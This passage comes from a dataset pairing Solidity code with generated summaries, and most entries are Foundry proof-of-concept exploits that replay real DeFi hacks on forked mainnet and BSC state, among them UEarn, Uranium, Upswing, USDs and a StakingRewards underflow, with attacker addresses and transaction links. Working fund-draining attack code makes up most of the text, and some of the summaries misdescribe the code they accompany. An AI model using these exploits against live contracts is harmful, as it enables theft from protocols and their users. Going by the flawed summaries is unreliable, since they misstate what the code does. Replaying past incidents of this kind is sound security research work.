CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n    function setUp() public {\n        cheat.createSelectFork(\"bsc\", 23120167);\n    }\n\n    function testExploit() public{\n        contractFactory();\n        // bind invitor\n        (bool success, ) = contractList[0].call(abi.encodeWithSignature(\"bind(address)\", tx.origin));\n        require(success);\n        for(uint i = 1; i < 22; i++){\n            (bool success, ) = contractList[i].call(abi.encodeWithSignature(\"bind(address)\", contractList[i - 1]));\n            require(success);\n        }\n\n        Pair.swap(2_420_000 * 1e18, 0, address(this), new bytes(1));\n\n        emit log_named_decimal_uint(\n            \"[End] Attacker USDT balance after exploit\",\n            USDT.balanceOf(address(this)),\n            18\n        );\n\n    }\n\n    function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) public {\n        uint len = contractList.length;\n        // LevelConfig[3].teamAmount : 2_400_000\n        USDT.transfer(contractList[len - 1], 2_400_000 * 1e18);\n        (bool success1, ) = contractList[len - 1].call(abi.encodeWithSignature(\"stakeAndClaimReward(uint256)\", 2_400_000 * 1e18));\n        require(success1);\n        for(uint i = len - 2; i > 4; i--){\n            USDT.transfer(contractList[i], 20_000 * 1e18); // LevelConfig[3].Amount : 20_000\n            USDT.balanceOf(address(this));\n            // 162000 - 20000 + 1500, 1500 is the reduce amount of _addInviteReward(), claim remaining USDT when USDT amount in contract less than 162_000,\n            if(USDT.balanceOf(address(Pool)) < 143_500 * 1e18){\n                USDT.transfer(address(Pool), 143_500 * 1e18 - USDT.balanceOf(address(Pool)));\n            }\n            (bool success1, ) = contractList[i].call(abi.encodeWithSignature(\"stakeAndClaimReward(uint256)\", 20_000 * 1e18)); // LevelConfig[3].Amount : 20_000\n            require(success1);\n            (bool success2, ) = contractList[i].call(abi.encodeWithSignature(\"withdraw(address)\", address(this)));\n            require(success2);\n        }\n        contractList[0].call(abi.encodeWithSignature(\"withdraw(address)\", address(this))); // claim the reward from _addInviteReward() \n        contractList[1].call(abi.encodeWithSignature(\"withdraw(address)\", address(this)));\n        contractList[2].call(abi.encodeWithSignature(\"withdraw(address)\", address(this)));\n        contractList[3].call(abi.encodeWithSignature(\"withdraw(address)\", address(this)));\n        contractList[4].call(abi.encodeWithSignature(\"withdraw(address)\", address(this)));\n        uint borrowAmount = 2_420_000 * 1e18;\n        USDT.transfer(address(Pair), borrowAmount * 10000 / 9975 + 1000);\n    }\n\n    function contractFactory() public{\n        address _add;\n        bytes memory bytecode = type(claimReward).creationCode;\n        for(uint _salt = 0; _salt < 22; _salt++){\n            assembly{\n                _add := create2(0, add(bytecode, 32), mload(bytecode), _salt)\n            }\n            contractList.push(_add);\n        }\n    }\n\n\n}",
        "summary": "This code is for a smart contract on the Binance Smart Chain that exploits vulnerabilities in the UEarn yield farming protocol. The contract creates 22 instances of a smart contract that can be used to stake USDT in the UEarnPool. The first contract instance is used to bind an invitor, and each subsequent contract instance is bound to the previous one. Once all 22 instances have been created and bound to each other, a large amount of USDT is staked in the final contract to reach a reward threshold. Rewards are then claimed from UEarnPool by all 22 contracts in sequence, allowing the attacker to profit.",
        "id": "48319813-9b2f-4110-b27d-8155530e015f"
    },
    {
        "code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity 0.8.10;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\n// Analysis\n// https://twitter.com/peckshield/status/1581988895142526976\n// TX\n// https://etherscan.io/tx/0xf4a3d0e01bbca6c114954d4a49503fc94dfdbc864bded5530b51a207640d86b5\n\ninterface UER20 is IERC20{\n    function mint() external;\n}\n\ncontract ContractTest is DSTest{\n\n    UER20 UER = UER20(0x418C24191aE947A78C99fDc0e45a1f96Afb254BE);\n    IERC20 USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);\n    IERC20 WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);\n    Uni_Router_V3 Router = Uni_Router_V3(0xE592427A0AEce92De3Edee1F18E0157C05861564);\n\n    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n\n    function setUp() public {\n        cheats.createSelectFork(\"mainnet\", 15767837);\n    }\n\n    function testExploit() public{\n        uint ETHBalanceBefore = address(this).balance;\n        UER.mint();\n        UER.approve(address(Router), type(uint).max);\n        USDC.approve(address(Router), type(uint).max);\n        UERToUSDC();\n        USDCToWETH();\n        uint WETHProfit = WETH.balanceOf(address(this));\n\n        emit log_named_decimal_uint(\n            \"[End] Attacker WETH balance after exploit\",\n            WETHProfit,\n            18\n        );\n    }\n\n    function UERToUSDC() internal {\n        Uni_Router_V3.ExactInputSingleParams memory _Params = Uni_Router_V3.ExactInputSingleParams({\n            tokenIn: address(UER),\n            tokenOut: address(USDC),\n            fee: 500,\n            recipient: address(this),\n            deadline: block.timestamp,\n            amountIn: UER.balanceOf(address(this)),\n            amountOutMinimum: 0,\n            sqrtPriceLimitX96: 0\n        });\n        Router.exactInputSingle(_Params);\n    }\n\n    function USDCToWETH() internal {\n        Uni_Router_V3.ExactInputSingleParams memory _Params = Uni_Router_V3.ExactInputSingleParams({\n            tokenIn: address(USDC),\n            tokenOut: address(WETH),\n            fee: 500,\n            recipient: address(this),\n            deadline: block.timestamp,\n            amountIn: USDC.balanceOf(address(this)),\n            amountOutMinimum: 0,\n            sqrtPriceLimitX96: 0\n        });\n        Router.exactInputSingle(_Params);\n    }\n}\n",
        "summary": "This code defines a Solidity contract that tests an exploit on a specific set of smart contracts. The contract imports two other contracts, one for a specific interface and another for a UniSwap router. It also imports a separate \"CheatCodes\" contract. The contract has a setUp() function that creates a fork and a testExploit() function that executes the exploit, which involves calling two internal functions that move UER tokens through USDC tokens and into WETH tokens. The exploit ultimately logs the attacker's WETH balance after transferring tokens through the contracts.",
        "id": "06f46630-947e-416f-a8a9-90a65858ef85"
    },
    {
        "code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.10;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\n// @Analysis\n// https://twitter.com/BlockSecTeam/status/1613507804412940289\n// @TX\n// https://bscscan.com/tx/0x933d19d7d822e84e34ca47ac733226367fbee0d9c0c89d88d431c4f99629d77a\n\ninterface SHOP {\n    function buyPublicOffer(address _dao, uint256 _lpAmount) external;\n}\n\ninterface IUFT is IERC20{\n    function burn(uint256 _amount, address[] memory _tokens, address[] memory _adapters, address[] memory _pools) external;\n}\n\ncontract ContractTest is DSTest{\n    Uni_Router_V2 Router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);\n    SHOP shop = SHOP(0xCA49EcF7e7bb9bBc9D1d295384663F6BA5c0e366);\n    IUFT UFT = IUFT(0xf887A2DaC0DD432997C970BCE597A94EaD4A8c25);\n    IERC20 USDC = IERC20(0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d);\n    IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);\n    address UF = 0x2101e0F648A2b5517FD2C5D9618582E9De7a651A;\n\n    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n\n    function setUp() public {\n        cheats.createSelectFork(\"bsc\", 24705058); \n        cheats.label(address(shop), \"SHOP\");\n        cheats.label(address(USDC), \"USDC\");\n        cheats.label(address(UFT), \"UFT\");\n        cheats.label(address(WBNB), \"WBNB\");\n    }\n\n    function testExploit() external {\n        address [] memory path = new address[](2);\n        path[0] = address(WBNB);\n        path[1] = address(USDC);\n        Router.swapExactETHForTokensSupportingFeeOnTransferTokens{value: 4 * 1e17}(1, path, address(this), block.timestamp);\n        USDC.approve(address(shop), type(uint).max);\n        uint amount = USDC.balanceOf(address(this));\n        shop.buyPublicOffer(UF, amount);\n        address [] memory tokens = new address[](1);\n        tokens[0] = address(USDC);\n        address[] memory adapters = new address[](0);\n        address[] memory pools = new address[](0);\n        UFT.burn(amount, tokens, adapters, pools);\n        amount = 1_000 * 1e18;\n        shop.buyPublicOffer(UF, amount);\n        UFT.burn(amount, tokens, adapters, pools);\n\n        emit log_named_decimal_uint(\"Attacker USDC balance after exploit\", USDC.balanceOf(address(this)), USDC.decimals());\n    }\n\n    receive() payable external{}\n\n}",
        "summary": "This code is a Solidity smart contract that is designed to exploit a vulnerability in the SHOP contract on the Binance Smart Chain. The contract swaps a certain amount of BNB for USDC using the Uniswap router, then uses the USDC to buy UFT tokens from the SHOP contract. Once it has UFT tokens, it burns them to receive a large amount of ETH. The contract then repeats this process to receive more ETH. The contract is a testing script used to verify the exploit works, rather than an actual malicious contract.",
        "id": "d13930c6-c018-4518-a7c9-b43d4f7b5722"
    },
    {
        "code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.10;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\n// @KeyInfo - Total Lost : 700k\n// Attacker : 0x1751e3e1aaf1a3e7b973c889b7531f43fc59f7d0\n// AttackContract : 0x89767960b76b009416bc7ff4a4b79051eed0a9ee\n// StakingRewards contract: 0xB3FB1D01B07A706736Ca175f827e4F56021b85dE\n// Attack TX: https://etherscan.io/enslookup-search?search=https://ethtx.info/mainnet/0xe72d4e7ba9b5af0cf2a8cfb1e30fd9f388df0ab\n// Attack TX: https://bscscan.com/tx/0x784b68dc7d06ee181f3127d5eb5331850b5e690cc63dd099cd7b8dc863204bf6\n\ninterface IStakingRewards {\n    function withdraw(uint256 amount) external;\n}\n  \n\ncontract AttackContract is Test {\n    CheatCodes constant cheat = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n    IStakingRewards constant StakingRewards = IStakingRewards(0xB3FB1D01B07A706736Ca175f827e4F56021b85dE);\n    IERC20 constant uniLP = IERC20(0xB1BbeEa2dA2905E6B0A30203aEf55c399C53D042);\n\n    function setUp() public {\n        cheat.createSelectFork(\"mainnet\", 14421983);    // Fork mainnet at block 14421983\n    }\n\n    function testExploit() public {\n        emit log_named_decimal_uint(\"Before exploiting, Attacker UniLP Balance\", uniLP.balanceOf(address(this)),18);\n\n        StakingRewards.withdraw(8792873290680252648282);  //without putting any crypto, we can drain out the LP tokens in uniswap pool by underflow.\n        \n        /*\n        StakingRewards contract, vulnerable code snippet.\n    function _withdraw(uint256 amount, address user, address recipient) internal nonReentrant updateReward(user) {\n        require(amount != 0, \"Cannot withdraw 0\");\n\n        // not using safe math, because there is no way to overflow if stake tokens not overflow\n        _totalSupply = _totalSupply - amount;\n        _balances[user] = _balances[user] - amount;   //<---- underflow here.\n        */\n        emit log_named_decimal_uint(\"After exploiting, Attacker UniLP Balance\", uniLP.balanceOf(address(this)),18);\n\n    }\n}\n",
        "summary": "This code is an attack contract that exploits a vulnerability in the `IStakingRewards` contract. Specifically, it allows the attacker to drain out the LP tokens in the Uniswap pool by causing an underflow in the `StakingRewards` contract's `_balances` mapping. The code sets up a cheat code for forking the mainnet at a specific block and contains a function `testExploit()` that withdraws a large number of tokens without actually providing any crypto, causing the underflow and draining LP tokens.",
        "id": "0b6ddb5e-2af2-4070-91f1-49fa03536387"
    },
    {
        "code": "// SPDX-License-Identifier: MIT\n// by 0xAA\npragma solidity ^0.8.4;\n\ncontract UncheckedBank {\n    mapping (address => uint256) public balanceOf;    // \u4f59\u989dmapping\n\n    // \u5b58\u5165ether\uff0c\u5e76\u66f4\u65b0\u4f59\u989d\n    function deposit() external payable {\n        balanceOf[msg.sender] += msg.value;\n    }\n\n    // \u63d0\u53d6msg.sender\u7684\u5168\u90e8ether\n    function withdraw() external {\n        // \u83b7\u53d6\u4f59\u989d\n        uint256 balance = balanceOf[msg.sender];\n        require(balance > 0, \"Insufficient balance\");\n        balanceOf[msg.sender] = 0;\n        // Unchecked low-level call\n        bool success = payable(msg.sender).send(balance);\n    }\n\n    // \u83b7\u53d6\u94f6\u884c\u5408\u7ea6\u7684\u4f59\u989d\n    function getBalance() external view returns (uint256) {\n        return address(this).balance;\n    }\n}\n\ncontract Attack {\n    UncheckedBank public bank; // Bank\u5408\u7ea6\u5730\u5740\n\n    // \u521d\u59cb\u5316Bank\u5408\u7ea6\u5730\u5740\n    constructor(UncheckedBank _bank) {\n        bank = _bank;\n    }\n    \n    // \u56de\u8c03\u51fd\u6570\uff0c\u8f6c\u8d26ETH\u65f6\u4f1a\u5931\u8d25\n    receive() external payable {\n        revert();\n    }\n\n    // \u5b58\u6b3e\u51fd\u6570\uff0c\u8c03\u7528\u65f6 msg.value \u8bbe\u4e3a\u5b58\u6b3e\u6570\u91cf\n    function deposit() external payable {\n        bank.deposit{value: msg.value}();\n    }\n\n    // \u53d6\u6b3e\u51fd\u6570\uff0c\u867d\u7136\u8c03\u7528\u6210\u529f\uff0c\u4f46\u5b9e\u9645\u4e0a\u53d6\u6b3e\u5931\u8d25\n    function withdraw() external payable {\n        bank.withdraw();\n    }\n\n    // \u83b7\u53d6\u672c\u5408\u7ea6\u7684\u4f59\u989d\n    function getBalance() external view returns (uint256) {\n        return address(this).balance;\n    }\n}\n",
        "summary": "This code includes two Solidity contracts: `UncheckedBank` and `Attack`. \n\n`UncheckedBank` is a simple smart contract that allows users to deposit Ether and withdraw their balance from the contract. It stores the balance of each account in a mapping and uses a low-level call function to send Ether to the account when they withdraw.\n\n`Attack` is a contract that attempts to exploit a vulnerability in `UncheckedBank` by calling the `withdraw()` function and setting the balance of the caller to zero, but not subtracting this amount from the total balance of the contract. By doing this, `Attack` is able to withdraw more Ether than it should be able to. \n\nThe `Attack` contract overrides the `receive()` function to ensure that any attempts to transfer Ether to the contract will fail. \n\nOverall, this code demonstrates the importance of checking inputs and outputs and the dangers of making unchecked low-level calls in Solidity contracts.",
        "id": "8b8d5db3-035e-4676-bebf-8fe8924e5405"
    },
    {
        "code": "// SPDX-License-Identifier: MIT\n// wtf.academy\npragma solidity ^0.8.4;\n\n// \u7b80\u5355\u7684\u53ef\u5347\u7ea7\u5408\u7ea6\uff0c\u7ba1\u7406\u5458\u53ef\u4ee5\u901a\u8fc7\u5347\u7ea7\u51fd\u6570\u66f4\u6539\u903b\u8f91\u5408\u7ea6\u5730\u5740\uff0c\u4ece\u800c\u6539\u53d8\u5408\u7ea6\u7684\u903b\u8f91\u3002\n// \u6559\u5b66\u6f14\u793a\u7528\uff0c\u4e0d\u8981\u7528\u5728\u751f\u4ea7\u73af\u5883\ncontract SimpleUpgrade {\n    address public implementation; // \u903b\u8f91\u5408\u7ea6\u5730\u5740\n    address public admin; // admin\u5730\u5740\n    string public words; // \u5b57\u7b26\u4e32\uff0c\u53ef\u4ee5\u901a\u8fc7\u903b\u8f91\u5408\u7ea6\u7684\u51fd\u6570\u6539\u53d8\n\n    // \u6784\u9020\u51fd\u6570\uff0c\u521d\u59cb\u5316admin\u548c\u903b\u8f91\u5408\u7ea6\u5730\u5740\n    constructor(address _implementation){\n        admin = msg.sender;\n        implementation = _implementation;\n    }\n\n    // fallback\u51fd\u6570\uff0c\u5c06\u8c03\u7528\u59d4\u6258\u7ed9\u903b\u8f91\u5408\u7ea6\n    fallback() external payable {\n        (bool success, bytes memory data) = implementation.delegatecall(msg.data);\n    }\n\n    // \u5347\u7ea7\u51fd\u6570\uff0c\u6539\u53d8\u903b\u8f91\u5408\u7ea6\u5730\u5740\uff0c\u53ea\u80fd\u7531admin\u8c03\u7528\n    function upgrade(address newImplementation) external {\n        require(msg.sender == admin);\n        implementation = newImplementation;\n    }\n}\n\n// \u903b\u8f91\u5408\u7ea61\ncontract Logic1 {\n    // \u72b6\u6001\u53d8\u91cf\u548cproxy\u5408\u7ea6\u4e00\u81f4\uff0c\u9632\u6b62\u63d2\u69fd\u51b2\u7a81\n    address public implementation; \n    address public admin; \n    string public words; // \u5b57\u7b26\u4e32\uff0c\u53ef\u4ee5\u901a\u8fc7\u903b\u8f91\u5408\u7ea6\u7684\u51fd\u6570\u6539\u53d8\n\n    // \u6539\u53d8proxy\u4e2d\u72b6\u6001\u53d8\u91cf\uff0c\u9009\u62e9\u5668\uff1a 0xc2985578\n    function foo() public{\n        words = \"old\";\n    }\n}\n\n// \u903b\u8f91\u5408\u7ea62\ncontract Logic2 {\n    // \u72b6\u6001\u53d8\u91cf\u548cproxy\u5408\u7ea6\u4e00\u81f4\uff0c\u9632\u6b62\u63d2\u69fd\u51b2\u7a81\n    address public implementation; \n    address public admin; \n    string public words; // \u5b57\u7b26\u4e32\uff0c\u53ef\u4ee5\u901a\u8fc7\u903b\u8f91\u5408\u7ea6\u7684\u51fd\u6570\u6539\u53d8\n\n    // \u6539\u53d8proxy\u4e2d\u72b6\u6001\u53d8\u91cf\uff0c\u9009\u62e9\u5668\uff1a0xc2985578\n    function foo() public{\n        words = \"new\";\n    }\n}\n\n",
        "summary": "This code defines three contracts: `SimpleUpgrade`, `Logic1`, and `Logic2`. \n\nThe `SimpleUpgrade` contract is a simple upgradeable contract that allows its admin to change the logic contract address, which in turn changes the contract's behavior. It has a fallback function that delegates calls to the logic contract and an `upgrade` function to change the logic contract address. \n\nThe `Logic1` and `Logic2` contracts are two different versions of a logic contract that change the value of a string variable when a certain function is called. They are designed to be used as the logic contract by the `SimpleUpgrade` contract. \n\nThe code has a SPDX license identifier and a comment indicating it is for teaching purposes only and should not be used in production. It uses Solidity version 0.8.4.",
        "id": "c8ef479c-1601-4906-8bb0-e3e4c0b4be6d"
    },
    {
        "code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.0;\n\nimport \"forge-std/console2.sol\";\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\n// Total Lost: ~22 ETH\n// Attacker: 0xceed34f03a3e607cc04c2d0441c7386b190d7cf4\n// Attack Contract: 0x762d2a9f065304d42289f3f13cc8ea23226d3b8c\n// Vulnerable Contract: 0x35a254223960c18B69C0526c46B013D022E93902\n// Attack Tx: https://etherscan.io/tx/0x4b3df6e9c68ae482c71a02832f7f599ff58ff877ec05fed0abd95b31d2d7d912\n//            \n// block 16433821\n\n// @Analysis\n// https://twitter.com/QuillAudits/status/1615634917802807297\n\n\ninterface ITokenUPS is IERC20 {\n      function myPressure(address _address) external view returns(uint256);\n\n}\n\ncontract UpswingExploit is Test {\n    Uni_Router_V2 uniRouter = Uni_Router_V2(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);\n    IUniswapV2Pair lp = IUniswapV2Pair(0x0e823a8569CF12C1e7C216d3B8aef64A7fC5FB34);\n    address upsToken = 0x35a254223960c18B69C0526c46B013D022E93902;\n    address weth = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;\n    \n    function setUp() public {\n        vm.createSelectFork(\"mainnet\", 16433820);    // Fork mainnet at block 16433820\n        vm.label(address(uniRouter), \"uniRouterV2\");\n        vm.label(upsToken, \"upsToken\");\n        vm.label(weth, \"weth\");\n    }\n\n    function testExploit() public {\n      // sample attack with 1 ether\n      deal(weth, address(this), 1 ether);\n      address[] memory path = new address[](2);\n      path[0] = weth;\n      path[1] = upsToken;\n\n\n      IERC20(weth).approve(address(uniRouter), type(uint256).max);\n\n      uniRouter.swapExactTokensForTokens(1 ether, 0, path, address(this), block.timestamp); // => (amounts=[1000000000000000000, 199388836791259039979218])\n\n      console.log(\"prev preassure\", ITokenUPS(upsToken).myPressure(address(this)));\n\n      uint256 balance = IERC20(upsToken).balanceOf(address(this));\n      for(uint i; i < 8; ++i) {\n        IERC20(upsToken).transfer(address(lp), balance);\n        lp.skim(address(this));\n      }\n\n      console.log(\"after fake swaps preassure\", ITokenUPS(upsToken).myPressure(address(this)));\n\n      IERC20(upsToken).transfer(address(this), 0);\n\n      path[0] = upsToken;\n      path[1] = weth;\n\n      balance = IERC20(upsToken).balanceOf(address(this));\n      IERC20(upsToken).approve(address(uniRouter), type(uint256).max);\n      uniRouter.swapExactTokensForTokens(balance, 0, path, address(this), block.timestamp); // => (amounts=[1000000000000000000, 199388836791259039979218])\n\n      console.log(\"profit!\", IERC20(weth).balanceOf(address(this)) - 1 ether);\n      emit log_named_decimal_uint(\"After exploiting, Attacker WETH Balance\", IERC20(weth).balanceOf(address(this)) - 1 ether,18);\n\n    }\n}\n",
        "summary": "This Solidity code is a part of an exploit that was used to drain funds from a smart contract on the Ethereum blockchain. The exploit code imports some external libraries and contracts and defines a new contract called `UpswingExploit`. \n\nThe `setUp()` function is used to set up the necessary environment variables for the exploit to run. The main function `testExploit()` executes the actual exploit. \n\nThe exploit entails manipulating the execution of transactions on the Ethereum blockchain by swapping tokens using Uniswap, a decentralized exchange built on Ethereum. The attacker utilizes a vulnerability in the smart contract (`upsToken`) to manipulate its balances and ultimately withdraw funds to their own wallet. \n\nThe specific process includes exchanging WETH tokens (wrapped ether) for `upsToken` tokens through the Uniswap exchange, manipulating `upsToken` balances on the `lp` contract, swapping `upsToken` back to WETH using Uniswap, and ultimately transferring the WETH to the attacker's wallet.",
        "id": "4e36d52f-9d7f-4180-b39c-03e04b0da328"
    },
    {
        "code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.10;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\n// @KeyInfo - Total Lost : $50 M\n// Attacker : 0xd9936EA91a461aA4B727a7e0xc47bdd0a852a88a019385ea3ff57cf8de79f019d3661bcD6cD257481c\n// AttackContract : 0x2b528a28451e9853f51616f3b0f6d82af8bea6ae \n// Txhash : https://bscscan.com/tx/0x5a504fe72ef7fc76dfeb4d979e533af4e23fe37e90b5516186d5787893c37991\n\n// REF: https://twitter.com/FrankResearcher/status/1387347025742557186\n// Credit: https://medium.com/immunefi/building-a-poc-for-the-uranium-heist-ec83fbd83e9f\n\n/*\nVuln code: \n   uint balance0Adjusted = balance0.mul(10000).sub(amount0In.mul(16));\n   uint balance1Adjusted = balance1.mul(10000).sub(amount1In.mul(16));\n   require(balance0Adjusted.mul(balance1Adjusted) >= uint(_reserve0).mul(_reserve1).mul(1000**2), \u2018UraniumSwap: K\u2019);\n\nCritically, we see in Uranium\u2019s implementation that the magic value for fee calculation is 10000 instead of the original 1000. \nThe check does not apply the new magic value and instead uses the original 1000. \nThis means that the K after a swap is guaranteed to be 100 times larger than the K before the swap when no token balance changes have occurred.\n*/\nCheatCodes constant cheat = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\naddress constant wbnb = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;\naddress constant busd = 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56;\naddress constant uraniumFactory = 0xA943eA143cd7E79806d670f4a7cf08F8922a454F;\n\ninterface IWrappedNative {\n    function deposit() external payable;\n}\n\ncontract Exploit is Test {\n    function setUp() public {\n        cheat.createSelectFork(\"bsc\", 6920000);\n    }\n\n    function testExploit() public {\n        wrap();\n        takeFunds(wbnb, busd, 1 ether); \n        takeFunds(busd, wbnb, 1 ether); \n        console.log(\"BUSD STOLEN : \", IERC20(busd).balanceOf(address(this)));\n        console.log(\"WBNB STOLEN : \", IERC20(wbnb).balanceOf(address(this)));\n    }\n\n    function wrap() internal {\n        IWrappedNative(wbnb).deposit{value: 1 ether}();\n        console.log(\"WBNB start : \", IERC20(wbnb).balanceOf(address(this)));\n    }\n\n    function takeFunds(address token0, address token1, uint amount) internal {\n        IUniswapV2Factory factory = IUniswapV2Factory(uraniumFactory);\n        IUniswapV2Pair pair = IUniswapV2Pair(factory.getPair(address(token1), address(token0)));\n\n        IERC20(token0).transfer(address(pair), amount);\n        uint amountOut = (IERC20(token1).balanceOf(address(pair)) * 99) / 100;\n\n        pair.swap(\n            pair.token0() == address(token1) ? amountOut : 0,\n            pair.token0() == address(token1) ? 0 : amountOut,\n            address(this),\n            new bytes(0)\n        );\n    }\n}",
        "summary": "This code is an exploit contract that takes advantage of a vulnerability in the UraniumSwap smart contract. The vulnerability allows the attacker to steal BUSD and WBNB tokens from the UraniumSwap smart contract. The exploit works by tricking the UraniumSwap contract into calculating its fee using a magic value of 10000 instead of the original 1000. The exploit then swaps wrapped Binance Coin (WBNB) for BUSD and vice versa to steal them. The code also includes a function to wrap Binance Coin into its wrapped form before the exploit is carried out.",
        "id": "02d24171-52d8-4bf2-a244-65c5b5b87056"
    },
    {
        "code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.10;\n\nimport \"forge-std/Test.sol\";\nimport \"forge-std/console.sol\";\n\n// @Analysis\n// https://twitter.com/danielvf/status/1621965412832350208\n// https://medium.com/sperax/usds-feb-3-exploit-report-from-engineering-team-9f0fd3cef00c\n// @TX\n// https://arbiscan.io/tx/0xfaf84cabc3e1b0cf1ff1738dace1b2810f42d98baeea17b146ae032f0bdf82d5\n\ninterface USDs {\n    function balanceOf(address _account) external returns (uint256);\n    function mint(address _account, uint256 _amount) external;\n    function transfer(address to, uint256 amount) external returns (bool);\n    function vaultAddress() external returns (address);\n}\n\ncontract USDsTest is Test {\n    USDs usds = USDs(0xD74f5255D557944cf7Dd0E45FF521520002D5748);\n    address ATTACKER_CONTRACT = address(0xdeadbeef);\n\n    function setUp() public {\n        vm.createSelectFork(\"arbitrum\", 57803529);\n\n        vm.label(address(usds), \"USDs\");\n        vm.label(0x97A7E6Cf949114Fe4711018485D757b9c4962307, \"USDsImpl\");\n        vm.label(ATTACKER_CONTRACT, \"AttackerContract\");\n        vm.label(address(this), \"AttackerAddress\");\n\n        vm.prank(usds.vaultAddress());\n        usds.mint(address(this), 11e18);\n    }\n\n    function testExploit() public {\n        usds.transfer(ATTACKER_CONTRACT, 11e18);\n\n        // Etch code. In the real hack this was a Gnosis Safe being deployed\n        vm.etch(ATTACKER_CONTRACT, bytes(\"code\"));\n\n        // Trigger balance recalculation\n        vm.prank(ATTACKER_CONTRACT);\n        usds.transfer(address(this), 1);\n\n        console.log(\n            \"Attacker Contract balance after: \",\n            usds.balanceOf(ATTACKER_CONTRACT)\n        );\n    }\n}\n",
        "summary": "This code defines a Solidity smart contract that is intended to test an exploit in the USDs token on the Arbitrum network. The contract interacts with the USDs contract and attempts to transfer tokens to an `ATTACKER_CONTRACT`, etch new code onto it, and recalculate balance in order to exploit a vulnerability that was reported by the engineering team of the USDs project. The contract seems to be designed for testing purposes only.",
        "id": "6941ad98-9fc7-4369-8594-ad7ebe6a06b9"
    },
    {
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\npragma abicoder v2;\n\nimport \"@openzeppelin/contracts/access/Ownable.sol\";\n\ncontract UserStorage is Ownable {\n    struct User {\n        address userAddr;\n        string avatar;\n        string email;\n        uint256 isOnline;\n        uint256 userFlag;\n        uint256 credit;\n        uint256 regTime;\n        TradeStats tradeStats;\n        MorgageStats morgageStats;\n    }\n    struct TradeStats {\n        uint256 tradeTotal;\n        uint256 restTotal;\n    }\n    struct MorgageStats {\n        uint256 mortgage;\n        uint256 freezeMortgage;\n        uint256 relieveMortgage;\n        uint256 inviteUserCount;\n        uint256 inviteUserReward;\n        uint256 applyRelieveTime;\n        uint256 handleRelieveTime;\n    }\n    mapping(address => User) public users;\n    mapping(address => uint256) public userIndex;\n\n    User[] public userList;\n\n    event addUser(address _userAddr);\n    event updateUser(string _avatar, string _email, uint256 _isOnline);\n\n    address _restCAddr;\n    address _orderCAddr;\n    address _recordCAddr;\n    address _appealCAddr;\n\n    modifier onlyAuthFromAddr() {\n        require(_restCAddr != address(0), \"Invalid address call rest\");\n        require(_orderCAddr != address(0), \"Invalid address call order\");\n        require(_recordCAddr != address(0), \"Invalid address call record\");\n        require(_appealCAddr != address(0), \"Invalid address call appeal\");\n        _;\n    }\n\n    function authFromContract(\n        address _fromRest,\n        address _fromOrder,\n        address _fromRecord,\n        address _fromAppeal\n    ) external {\n        require(_restCAddr == address(0), \"rest address has Auth\");\n        require(_orderCAddr == address(0), \"order address has Auth\");\n        require(_recordCAddr == address(0), \"record address has Auth\");\n        require(_appealCAddr == address(0), \"appeal address has Auth\");\n        _restCAddr = _fromRest;\n        _orderCAddr = _fromOrder;\n        _recordCAddr = _fromRecord;\n        _appealCAddr = _fromAppeal;\n    }\n\n    modifier onlyMemberOf() {\n        require(users[msg.sender].userAddr != address(0), \"has no permission\");\n        _;\n    }\n\n    function _insert(address _addr) internal {\n        require(_addr != address(0), \"UserStorage: addr null is not allowed\");\n        require(\n            users[_addr].userAddr == address(0),\n            \"UserStorage: current User exist\"\n        );\n\n        TradeStats memory tradeStats = TradeStats({\n            tradeTotal: 0,\n            restTotal: 0\n        });\n        MorgageStats memory morgageStats = MorgageStats({\n            mortgage: 0,\n            freezeMortgage: 0,\n            relieveMortgage: 0,\n            inviteUserCount: 0,\n            inviteUserReward: 0,\n            applyRelieveTime: 0,\n            handleRelieveTime: 0\n        });\n\n        User memory u = User({\n            userAddr: _addr,\n            avatar: \"\",\n            email: \"\",\n            isOnline: 1,\n            userFlag: 0,\n            credit: 0,\n            regTime: block.timestamp,\n            tradeStats: tradeStats,\n            morgageStats: morgageStats\n        });\n        users[_addr] = u;\n\n        userList.push(u);\n        userIndex[_addr] = userList.length - 1;\n        emit addUser(_addr);\n    }\n\n    function _updateInfo(\n        address _addr,\n        string memory _avatar,\n        string memory _email,\n        uint256 _isOnline\n    ) internal {\n        require(_addr != address(0), \"UserStorage: _addr null is not allowed\");\n        require(\n            users[_addr].userAddr != address(0),\n            \"UserStorage: current User not exist\"\n        );\n\n        User memory u = users[_addr];\n        if (bytes(_avatar).length != 0) {\n            u.avatar = _avatar;\n        }\n        if (bytes(_email).length != 0) {\n            u.email = _email;\n        }\n\n        if (_isOnline != uint256(0)) {\n            u.isOnline = _isOnline;\n        }\n\n        users[_addr] = u;\n        userList[userIndex[_addr]] = u;\n    }\n\n    function _updateTradeStats(\n        address _addr,\n        TradeStats memory _tradeStats,\n        uint256 _credit\n    ) internal {\n        require(_addr != address(0), 